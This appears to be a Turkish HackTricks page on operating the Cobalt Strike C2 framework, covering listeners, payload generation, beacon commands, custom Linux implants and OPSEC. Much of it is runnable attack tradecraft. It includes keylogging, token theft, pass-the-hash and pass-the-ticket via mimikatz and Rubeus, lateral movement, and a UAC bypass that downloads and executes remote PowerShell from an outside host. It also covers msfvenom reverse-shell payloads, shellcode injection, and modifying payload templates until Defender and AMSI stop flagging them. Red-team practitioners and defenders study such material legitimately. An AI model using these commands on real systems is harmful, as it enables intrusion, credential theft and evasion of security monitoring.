# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Dinleyiciler

### C2 Dinleyicileri

`Cobalt Strike -> Listeners -> Add/Edit` bölümüne gidin; ardından nerede dinleme yapılacağını, hangi tür beacon kullanılacağını (http, dns, smb...) ve daha fazlasını seçebilirsiniz.

### Peer2Peer Dinleyicileri

Bu dinleyicilerin beacon’larının doğrudan C2 ile iletişim kurması gerekmez; C2 ile diğer beacon’lar üzerinden iletişim kurabilirler.

`Cobalt Strike -> Listeners -> Add/Edit` bölümüne gidin ve TCP veya SMB beacon’larını seçin

* **TCP beacon, seçilen portta bir listener ayarlar**. Bir TCP beacon’a bağlanmak için başka bir beacon’dan `connect <ip> <port>` komutunu kullanın.
* **SMB beacon, seçilen ada sahip bir pipename üzerinde dinleme yapar**. Bir SMB beacon’a bağlanmak için `link [target] [pipe]` komutunu kullanmanız gerekir.

### Payload oluşturma ve barındırma

#### Payload’ları dosyalarda oluşturma

`Attacks -> Packages ->`

* HTA dosyaları için **`HTMLApplication`**
* Makro içeren bir Office belgesi için **`MS Office Macro`**
* .exe, .dll veya servis .exe için **`Windows Executable`**
* **stageless** .exe, .dll veya servis .exe için **`Windows Executable (S)`** (staged yerine stageless tercih edilir; daha az IoC)

#### Payload oluşturma ve barındırma

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Bu seçenek, beacon’ı Cobalt Strike’dan indirmek için bitsadmin, exe, powershell ve python gibi biçimlerde bir script/executable oluşturur.

#### Payload’ları barındırma

Barındırmak istediğiniz dosya zaten bir web sunucusundaysa, `Attacks -> Web Drive-by -> Host File` bölümüne gidip barındırılacak dosyayı ve web server yapılandırmasını seçin.

### Beacon seçenekleri

<details>
<summary>Beacon seçenekleri ve komutları</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Özel implantlar / Linux Beacons

- Özel bir agent'ın kayıt/check-in yapıp görev alabilmesi için yalnızca Cobalt Strike Team Server HTTP/S protokolünü (varsayılan malleable C2 profile) konuşması gerekir. Görev ve çıktı için Cobalt Strike UI'ını yeniden kullanmak üzere profile tanımlanan aynı URI'leri/başlıkları/metadata şifrelemesini uygulayın.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Bir Aggressor Script (ör. `CustomBeacon.cna`), Windows dışındaki beacon için payload üretimini sarmalayarak operatörlerin listener'ı seçip ELF payload'larını doğrudan GUI üzerinden oluşturmasını sağlayabilir.
- Team Server'a sunulan Linux görev işleyicilerine örnekler: `sleep`, `cd`, `pwd`, `shell` (rastgele komutları çalıştırır), `ls`, `upload`, `download` ve `exit`. Bunlar Team Server'ın beklediği görev ID'leriyle eşleşir ve çıktıyı uygun formatta döndürmek için sunucu tarafında uygulanmalıdır.
- Linux'ta BOF desteği, Beacon Object Files'ı süreç içinde [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) ile yükleyerek eklenebilir (Outflank tarzı BOF'ları da destekler). Böylece modüler post-exploitation, yeni süreçler başlatmadan implantın bağlamı/ayrıcalıkları içinde çalıştırılabilir.<sup>[[2]](#references)[[3]](#references)</sup>
  Ayrı bir BOF tasking örneğiyle birlikte Linux loader formatı ve süreç sınırı uyarıları için bkz. [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Windows Beacons ile aynı pivoting işlevselliğini korumak için özel beacon'a bir SOCKS handler ekleyin: operatör `socks <port>` çalıştırdığında implant, operatör araçlarını ele geçirilmiş Linux host üzerinden iç ağlara yönlendirecek yerel bir proxy açmalıdır.

## Opsec

### Execute-Assembly

**`execute-assembly`**, belirtilen programı çalıştırmak için remote process injection kullanarak bir **sacrificial process** kullanır. Bu işlem oldukça gürültülüdür; bir sürece enjeksiyon yapmak için her EDR'ın denetlediği bazı Win API'ler kullanılır. Ancak aynı süreçte bir şeyi yüklemek için kullanılabilecek bazı özel araçlar vardır:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike'ta BOF (Beacon Object Files) da kullanabilirsiniz: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

`https://github.com/outflanknl/HelpColor` agressor script'i, Cobalt Strike'ta komutlara renk ekleyen `helpx` komutunu oluşturur. Bu renkler, komutların BOF (yeşil), Frok&Run (sarı) veya ProcessExecution, injection ya da benzeri (kırmızı) olup olmadığını gösterir. Böylece hangi komutların daha gizli olduğunu anlamaya yardımcı olur.

### Modern süreç içi post-execution

Güncel sürümler, klasik bir COFF BOF fazla kısıtlı olduğunda kullanılabilecek iki alternatif ekler:

- **Beacon Interpreter**, C kodunu Team Server üzerinde ara bytecode'a derler ve Beacon içine gömülü bir VM'de çalıştırır. Bytecode, yerel çalıştırılabilir kod yerine veri olarak kaldığından, BOF yüklemek için normalde gereken ek çalıştırılabilir bellek tahsisini ve RW'den RX'e izin geçişini önler. Script'ler Beacon API'yi içe aktarabilir ve BOF tarzı Dynamic Function Resolution (DFR) prototipleri tanımlayabilir.
- **BOF-PE**, tam bir EXE veya DLL'i mevcut Beacon'a yükler. Bu format, Beacon API'yi korurken normal PE import'larını, exception handling'i, daha kapsamlı C++ özelliklerini ve harici kütüphaneleri destekler. Küçük bir COFF BOF'tan daha ağırdır; bu nedenle yalnızca ek runtime gerektiğinde tercih edin.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Bu mekanizmalar loader kaynaklı sinyalleri azaltır; betiğin eylemlerinin veya Windows API çağrılarının oluşturduğu telemetriyi azaltmaz.<sup>[[8]](#references)</sup>

### Kullanıcı gibi davranın

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` gibi olayları kontrol edebilirsiniz:

- Security EID 4624 - Alışılmış çalışma saatlerini belirlemek için tüm etkileşimli oturum açma işlemlerini kontrol edin.
- System EID 12,13 - Kapatma/başlatma/uyku sıklığını kontrol edin.
- Security EID 4624/4625 - Gelen geçerli/geçersiz NTLM denemelerini kontrol edin.
- Security EID 4648 - Bu olay, düz metin kimlik bilgileriyle oturum açıldığında oluşturulur. Olayı bir işlem oluşturduysa, ikili dosyada muhtemelen bir yapılandırma dosyasında veya kod içinde açık metin olarak kimlik bilgileri bulunur.

Cobalt Strike'ta `jump` kullanırken yeni işlemin daha meşru görünmesi için `wmi_msbuild` yöntemini kullanmak daha iyidir.

### Bilgisayar hesaplarını kullanın

Savunma ekiplerinin kullanıcıların oluşturduğu olağandışı davranışları kontrol etmesi yaygındır; ancak **izlemelerinde hizmet hesaplarını ve `*$` gibi bilgisayar hesaplarını hariç tutabilirler**. Yanal hareket veya ayrıcalık yükseltme için bu hesapları kullanabilirsiniz.

### Stageless payload'lar kullanın

Stageless payload'lar, C2 sunucusundan ikinci bir aşama indirmeleri gerekmediği için staged payload'lardan daha az gürültülüdür. Bu, ilk bağlantıdan sonra ağ trafiği oluşturmadıkları ve dolayısıyla ağ tabanlı savunmalar tarafından tespit edilme olasılıklarının daha düşük olduğu anlamına gelir.

### Token'lar ve Token Store

Token çalarken veya oluştururken dikkatli olun; EDR, thread token'larını listeleyip işlem içinde **farklı bir kullanıcıya veya SYSTEM'e ait bir token** tespit edebilir.

Bu özellik, token'ları **beacon başına** depolamanızı sağlar; böylece aynı token'ı tekrar tekrar çalmanız gerekmez. Yanal hareket için veya çalınmış bir token'ı birden çok kez kullanmanız gerektiğinde faydalıdır:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Yanal hareket sırasında genellikle yeni bir token oluşturmak veya pass the hash saldırısı gerçekleştirmek yerine **bir token çalmak** daha iyidir.

### Guardrails

Cobalt Strike, savunma ekipleri tarafından tespit edilebilecek belirli komutların veya eylemlerin kullanımını önlemeye yardımcı olan **Guardrails** adlı bir özelliğe sahiptir. Guardrails; yanal hareket veya ayrıcalık yükseltme için sık kullanılan `make_token`, `jump`, `remote-exec` ve diğer belirli komutları engelleyecek şekilde yapılandırılabilir.

Ayrıca [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) deposunda da bir payload çalıştırmadan önce göz önünde bulundurabileceğiniz bazı kontroller ve fikirler bulunur.

### Ticket şifrelemesi

AD ortamında ticket'ların şifrelemesine dikkat edin. Bazı araçlar varsayılan olarak Kerberos ticket'ları için AES şifrelemesinden daha zayıf olan RC4 şifrelemesini kullanır; güncel ortamlar ise varsayılan olarak AES kullanır. Zayıf şifreleme algoritmalarını izleyen savunma ekipleri bunu tespit edebilir.

### Varsayılanlardan kaçının

Cobalt Strike kullanırken SMB pipe'ları varsayılan olarak `msagent_####` ve `"status_####` adlarını kullanır. Bu adları değiştirin. Mevcut pipe'ların adlarını Cobalt Strike'ta `ls \\.\pipe\` komutuyla kontrol edebilirsiniz.

Ayrıca SSH oturumlarında `\\.\pipe\postex_ssh_####` adlı bir pipe oluşturulur. `set ssh_pipename "<new_name>";` ile adını değiştirin.

Post-exploitation saldırılarında `\\.\pipe\postex_####` pipe'ları da `set pipename "<new_name>"` ile değiştirilebilir.

Cobalt Strike profillerinde aşağıdaki gibi ayarları da değiştirebilirsiniz:

- `rwx` kullanmaktan kaçınma
- `process-inject {...}` bloğunda işlem enjeksiyonu davranışının (hangi API'lerin kullanılacağının) nasıl çalıştığı
- `post-ex {…}` bloğunda "fork and run" işleyişi
- Uyku süresi
- Belleğe yüklenecek ikili dosyaların azami boyutu
- `stage {...}` bloğunda bellek ayak izi ve DLL içeriği
- Ağ trafiği

### Sleepmask ve BeaconGate

Sleepmask, Beacon'ı ve izlediği heap tahsislerini boşta olduğu sırada dönüştürür, ardından görev yürütülürken eski hâline getirir. Güncel sürümlerde varsayılan olarak kaçınma sağlayan bir yapılandırma bulunur; ancak bellek düzeni, tahsis veya çağrı yığını gereksinimleri farklı olduğunda özel Sleepmask BOF'ları hâlâ yararlıdır. 4.13 sürümünden itibaren varsayılan Sleepmask, BeaconGate üzerinden proxy'lenen API'ler için dönüş adresini de taklit eder.<sup>[[8]](#references)</sup>

**BeaconGate**, bu tasarımı `Sleep` işlevinin ötesine taşır: Seçili WinAPI çağrıları `FUNCTION_CALL` yapıları olarak temsil edilir ve Sleepmask BOF'una iletilir. BOF, çağrı yürütülürken Beacon'ı maskeleyebilir. Profil, bir grubu (`Comms`, `Core`, `Cleanup` veya `All`) ya da yalnızca belirli API'leri gate edebilir:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

`beacon_gate` altında listelenen bir API için gate, `syscall_method` ayarından önceliklidir; listelenmeyen API'ler yapılandırılmış syscall yöntemini kullanmaya devam edebilir. `beacon_gate disable` ve `beacon_gate enable` özelliği çalışma zamanında kapatıp açar. `All` seçeneğini düşünmeden etkinleştirmeyin: `ps` gibi komutlar tekrar tekrar `OpenProcess`/`CloseHandle` çağırır ve her çağrıda Beacon maskelenip maskesi kaldırıldığında CPU kullanımında ani artışa neden olabilir. Sleepmask-VS, özel gate'leri canlı bir implant üzerinden tekrar tekrar test etmeden hata ayıklamak için taklit edilmiş Beacon/Sleepmask durumu sağlar.<sup>[[9]](#references)</sup>

### Gürültülü proc injections

Bir sürece kod enjekte etmek genellikle çok gürültülüdür; bunun nedeni **normal süreçlerin genellikle bu işlemi yapmaması ve bunu gerçekleştirmenin yollarının çok sınırlı olmasıdır**. Bu nedenle, davranış tabanlı tespit sistemleri tarafından tespit edilebilir. Ayrıca, belleği tarayarak **diskte bulunmayan kod içeren thread'leri** tespit eden EDR'ler tarafından da tespit edilebilir (JIT kullanan tarayıcılar gibi süreçlerde bu durum yaygındır). Örnek: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID ve PPID ilişkileri

Yeni bir süreç başlatırken tespitten kaçınmak için süreçler arasında **normal bir üst-alt ilişkisini korumak** önemlidir. svchost.exe, iexplorer.exe'yi çalıştırıyorsa bu şüpheli görünür; çünkü normal bir Windows ortamında svchost.exe, iexplorer.exe'nin üst süreci değildir.

Cobalt Strike'ta yeni bir Beacon başlatıldığında, varsayılan olarak yeni listener'ı çalıştırmak için **`rundll32.exe`** kullanan bir süreç oluşturulur. Bu pek gizli değildir ve EDR'ler tarafından kolayca tespit edilebilir. Üstelik `rundll32.exe` herhangi bir argüman olmadan çalıştırılır, bu da onu daha şüpheli hâle getirir.

Aşağıdaki Cobalt Strike komutuyla yeni Beacon'ı başlatacak farklı bir süreç belirleyerek tespit edilme olasılığını azaltabilirsiniz:

```bash
spawnto x86 svchost.exe
```

Bu ayarı bir profile içinde **`spawnto_x86` ve `spawnto_x64`** olarak da değiştirebilirsiniz.

### Saldırgan trafiğini proxy üzerinden yönlendirme

Saldırganların bazen, Linux makinelerde bile araçları yerel olarak çalıştırabilmesi ve kurbanların trafiğini bu araçlara yönlendirebilmesi gerekir (ör. NTLM relay).

Ayrıca bazen pass-the.hash veya pass-the-ticket saldırısı gerçekleştirmek için saldırganın bu hash'i veya ticket'ı yerel olarak kendi LSASS sürecine **eklemesi** ve kurban makinenin LSASS sürecini değiştirmek yerine buradan pivot etmesi daha stealth olabilir.

Ancak **oluşturulan trafiğe** dikkat etmeniz gerekir; backdoor sürecinizden alışılmadık trafik (Kerberos?) gönderiyor olabilirsiniz. Bunun için bir browser sürecine pivot edebilirsiniz (ancak bir sürece kendinizi inject ederken yakalanabilirsiniz; bu yüzden bunu stealth şekilde yapmayı düşünün).


### AV'lerden kaçınma

#### AV/AMSI/ETW Bypass

Şu sayfaya göz atın:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Genellikle `/opt/cobaltstrike/artifact-kit` içinde, Cobalt Strike'ın binary Beacon'ları oluşturmak için kullanacağı payload'ların kodunu ve önceden derlenmiş şablonlarını (`/src-common` içinde) bulabilirsiniz.

ThreatCheck'i ([ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)) oluşturulan backdoor ile (veya yalnızca derlenmiş şablonla) kullanarak Defender'ın tetiklenmesine neyin yol açtığını bulabilirsiniz. Bu genellikle bir string'dir. Bu nedenle, string'in son binary'de görünmemesi için backdoor'u oluşturan kodu değiştirebilirsiniz.

Kodu değiştirdikten sonra aynı dizinden `./build.sh` komutunu çalıştırın ve `dist-pipe/` klasörünü Windows istemcisindeki `C:\Tools\cobaltstrike\ArtifactKit` konumuna kopyalayın.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Cobalt Strike'a, yüklü olanlar yerine istediğimiz disk kaynaklarını kullanmasını belirtmek için `dist-pipe\artifact.cna` aggressive script'ini yüklemeyi unutmayın.

#### Resource Kit

ResourceKit klasörü, PowerShell, VBA ve HTA dahil Cobalt Strike'ın script tabanlı payload'ları için şablonları içerir.

Şablonlarla [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak Defender'ın (bu durumda AMSI) neyi beğenmediğini bulabilir ve bunu değiştirebilirsiniz:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Değiştirilen tespit satırlarıyla yakalanmayacak bir template oluşturabilirsiniz.

Cobalt Strike'a istediğimiz disk kaynaklarını kullanmasını ve yüklenenleri kullanmamasını belirtmek için agresif script `ResourceKit\resources.cna` dosyasını yüklemeyi unutmayın.

#### Function hooks | Syscall

Function hooking, EDR'ların kötü amaçlı etkinlikleri tespit etmek için kullandığı çok yaygın bir yöntemdir. Cobalt Strike, standart Windows API çağrıları yerine **syscall** kullanarak **`None`** config'iyle bu hook'ları atlamanıza olanak tanır. Ayrıca **`Direct`** ayarıyla bir fonksiyonun `Nt*` sürümünü kullanabilir veya malleable profile'daki **`Indirect`** seçeneğiyle `Nt*` fonksiyonunun üzerinden atlayabilirsiniz. Sisteme bağlı olarak, seçeneklerden biri diğerinden daha gizli olabilir.

Bu, profile'da veya **`syscall-method`** komutuyla ayarlanabilir.

 Ancak bu da gürültülü olabilir.

Cobalt Strike'ın function hook'larını atlamak için sunduğu seçeneklerden biri, bu hook'ları şu araçla kaldırmaktır: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Hangi fonksiyonların hook'landığını [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) veya [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) ile de kontrol edebilirsiniz.




<details>
<summary>Çeşitli Cobalt Strike komutları</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (özel implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF şablonu](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42'ın Cobalt Strike metadata şifrelemesi analizi](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike trafiği üzerine SANS ISC günlüğü](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Çeviride Kayboldu](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: BeaconGate'den Geçerken](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
